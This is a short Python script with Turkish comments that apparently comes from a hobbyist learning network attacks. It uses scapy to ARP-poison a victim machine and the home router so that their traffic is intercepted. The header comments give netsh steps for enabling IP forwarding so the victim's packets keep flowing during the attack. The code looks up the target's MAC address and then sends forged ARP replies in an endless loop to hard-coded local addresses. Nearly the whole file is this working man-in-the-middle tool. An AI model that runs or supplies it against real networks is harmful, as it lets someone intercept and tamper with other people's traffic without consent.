# bu attack öncesi ip_forward açmak lazım. Yoksa client paketleri makinamız iletemez.
#https://kb.iweb.com/hc/en-us/articles/230239648-Activate-IP-Forwarding-on-the-physical-server-for-a-specific-network-interface
#powershell ile
#PS C:\> netsh
#netsh>interface ipv4
#netsh interface ipv4>show interfaces
#netsh interface ipv4>show interface idx  #benimkide wifi idsi 17
#Forwarding                         : enabled # listede benimki zaten forwarding enable durumdaydı
#set interface 17 forwarding="enabled"  #enable yada disable yapabiliriz

import scapy.all as scapy
import time
#girdiğimiz ip nin macini veren method
def get_mac_address(ip):
    apr_request_package = scapy.ARP(pdst=ip)
    broadcas_package = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_package = broadcas_package/apr_request_package
    answered_list = scapy.srp(combined_package,timeout=1,verbose=False)[0]
    #print(answered_list[0][0].hwsrc)
    return answered_list[0][0].hwsrc


def arp_poisoning(target_ip, modem_ip):
    target_mac = get_mac_address(target_ip)
    #pdst hedef, hwdst kendi mac adresimiz psrc modemin ipsi
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=modem_ip)
    scapy.send(arp_response,verbose=False)

#get_mac_address("192.168.1.42")
number = 0
try:
    while True:
        number += 2
        arp_poisoning("192.168.1.103","192.168.1.1") # bu windowsu spooflıycak(kandırma)
        arp_poisoning("192.168.1.1","192.168.1.103") # buda modemi spooflayacak
        print("\r Sending packets " + str(number), end="") # bunu python3 diyerek çalıştırabiliriz.
        time.sleep(3) # 3 saniye bekle
except KeyboardInterrupt:
    print("\nQuit & Reset")